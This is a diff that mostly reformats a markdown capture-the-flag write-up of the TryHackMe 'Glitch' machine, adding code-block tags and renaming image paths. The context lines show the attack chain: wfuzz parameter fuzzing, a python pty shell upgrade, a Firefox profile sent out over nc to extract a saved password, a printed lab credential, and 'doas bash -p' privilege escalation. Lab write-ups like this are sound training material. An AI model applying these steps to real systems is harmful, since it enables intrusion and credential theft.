@@ -46,7 +46,7 @@ We see that while trying to send a post request to /api/items we get this messag
 
 Since,we are able to send POST requests.Let us search which parameters are available with wfuzz.
 
-```
+```shell
 wfuzz -XPOST -u http://ip/api/items?FUZZ=id -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt --hh 45
 ```
 
@@ -73,7 +73,7 @@ Listening to the PORT we have the shell.
 
 we stabilise our shell then with,
 
-```
+```shell
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
@@ -83,15 +83,15 @@ Looking in the directories we get our user flag.
 
 Here's our user flag:**THM{i_don't_know_why}**
 
-After some searching we found a **.firefox** folder inside **/home/user/** directory
+After some searching we found a .firefox folder inside /home/user/ directory
 
 We can take advantage of this folder and extract next user's password...
 
 Firstly we created a tar file of the .firefox folder and sent it to our terminal through nc
 
-![](/images/D4rkDemian/_glitch2.png)
+![](/images/D4rkDemian/glitch2.png)
 
-![](/images/D4rkDemian/_glitch3.png)
+![](/images/D4rkDemian/glitch3.png)
 
 After running following command we got the v0id user's password 
 
@@ -99,7 +99,7 @@ After running following command we got the v0id user's password
 firefox --profile b5w4643p.default-release --allow-downgrade
 ```
 
-![](/images/D4rkDemian/_glitch.png)
+![](/images/D4rkDemian/glitch.png)
 
 ```
 v0id:love_the_void
@@ -113,14 +113,14 @@ find / -type f -perm /40000 2>/dev/null
 ```
 and doas was a sus!
 
-![](/images/D4rkDemian/_glitch4.png)
+![](/images/D4rkDemian/glitch4.png)
 
 After reading about it in [doas](https://github.com/slicer69/doas) i used the following command and got the root
 
 ```shell
 doas bash -p
 ```
-![](/images/D4rkDemian/_glitch5.png)
+![](/images/D4rkDemian/glitch5.png)
 
 And finally got the root flag!!
 
